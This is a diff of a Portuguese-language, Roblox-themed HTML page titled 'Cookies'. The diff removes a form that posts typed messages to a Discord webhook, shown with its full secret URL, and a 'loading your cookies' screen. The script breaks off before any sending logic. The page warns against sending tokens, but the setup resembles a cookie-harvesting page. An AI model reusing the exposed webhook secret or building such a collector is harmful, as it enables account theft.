@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Cookies</title>
+  <title>Yoshin Metod</title>
 
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
@@ -19,7 +19,6 @@
     *{box-sizing: border-box}
     html,body{height:100%;margin:0;background:var(--bg-dark);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;}
 
-    /* Background image + dark overlay */
     body{
       background-image: url("https://tr.rbxcdn.com/4f4b3a2b6e4d3f6c9f8b0e2b3c2a1d5a/768/432/Rotate/0/0/");
       background-size: cover;
@@ -35,13 +34,11 @@
       content:"";position:absolute;inset:0;background:linear-gradient(180deg, rgba(3,3,3,0.7), rgba(0,0,0,0.9));mix-blend-mode:multiply;z-index:0;
     }
 
-    /* Container */
     .wrap{
       position:relative;z-index:2;width:100%;max-width:720px;
       display:grid;grid-template-columns:1fr 380px;gap:22px;align-items:center;
     }
 
-    /* Left panel (hero) */
     .hero{
       padding:28px;border-radius:16px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));
       border:1px solid rgba(255,255,255,0.04);
@@ -58,7 +55,6 @@
     h1{margin:0;font-family:Orbitron, sans-serif;letter-spacing:1px;color:var(--accent);font-size:1.8rem}
     p.lead{margin:10px 0 0;color:rgba(234,234,234,0.85);line-height:1.4}
 
-    /* Right panel (form) */
     .card{
       padding:20px;border-radius:16px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.45));
       border:1px solid rgba(255,255,255,0.04);backdrop-filter: blur(8px);
@@ -79,67 +75,6 @@
 
     .status{height:18px;margin-top:10px;font-size:0.9rem;color:#ffbcbc;display:none}
 
-    /* Loading overlay (full-screen) */
     #overlay{
       position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:9999;
       background:linear-gradient(180deg, rgba(0,0,0,0.7), rgba(0,0,0,0.95));
-      color:white;font-family:Orbitron, sans-serif;text-align:center;padding:20px;
-    }
-    .loader-card{width:95%;max-width:560px;padding:26px;border-radius:14px;background:linear-gradient(180deg, rgba(18,18,18,0.85), rgba(10,10,10,0.9));border:1px solid rgba(255,255,255,0.04)}
-    .loader-title{font-size:1.5rem;color:var(--accent);margin-bottom:14px}
-    .loader-sub{font-size:0.95rem;opacity:0.9;margin-bottom:18px}
-    .progress{
-      width:100%;height:14px;border-radius:999px;background:rgba(255,255,255,0.06);overflow:hidden;position:relative;
-    }
-    .progress .slide{position:absolute;left:-40%;top:0;height:100%;width:36%;background:linear-gradient(90deg, rgba(255,255,255,0.08), rgba(255,0,0,0.9));animation:progressMove 1.1s linear infinite}
-    @keyframes progressMove{0%{left:-40%}100%{left:140%}}
-
-    /* responsive */
-    @media (max-width:880px){
-      .wrap{grid-template-columns:1fr;gap:14px}
-    }
-  </style>
-</head>
-<body>
-
-  <div class="wrap" role="main" aria-labelledby="title">
-    <div class="hero" aria-hidden="false">
-      <div class="logo">
-        <div class="logo-mark">C</div>
-        <div>
-          <h1 id="title">Cookies</h1>
-          <p class="lead">Painel estilizado — digite qualquer texto (nada sensível) e clique em Enviar.</p>
-        </div>
-      </div>
-
-      <p style="margin-top:18px;color:rgba(234,234,234,0.8)">Design moderno, responsivo e com animações suaves. O site TEM bloqueio automático para possíveis tokens/cookies — por sua segurança e legalidade.</p>
-    </div>
-
-    <div class="card" aria-label="Formulário de envio">
-      <label for="userText">Mensagem (qualquer texto)</label>
-      <input id="userText" type="text" placeholder="Escreva algo aqui... (não envie senhas ou tokens)" autocomplete="off" />
-
-      <button id="sendBtn" class="btn" aria-label="Enviar mensagem">Enviar</button>
-
-      <div id="note" class="note">As mensagens serão enviadas ao webhook do servidor. Não envie dados sensíveis.</div>
-      <div id="status" class="status" role="status" aria-live="polite"></div>
-    </div>
-  </div>
-
-  <!-- Overlay de carregamento -->
-  <div id="overlay" role="status" aria-hidden="true">
-    <div class="loader-card" role="dialog" aria-modal="true" aria-label="Carregando">
-      <div class="loader-title">CARREGANDO SEUS COOKIES</div>
-      <div class="loader-sub">Aguarde enquanto processamos a sua mensagem...</div>
-      <div class="progress" aria-hidden="true"><div class="slide"></div></div>
-    </div>
-  </div>
-
-<script>
-  // ---------- CONFIGURAÇÃO (já definida com o webhook que você passou) ----------
-  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1440869478354124912/UeJLq2EsBNa7F7qmZlzeWASC9ePkHsRp6aq4Ca8UB0pevj60dfnW9ksXKoDa-RdQwgLw";
-  // ------------------------------------------------------------------------------
-
-  const input = document.getElementById('userText');
-  const btn = document.getElementById('sendBtn');
-  const overlay = document.getElementById
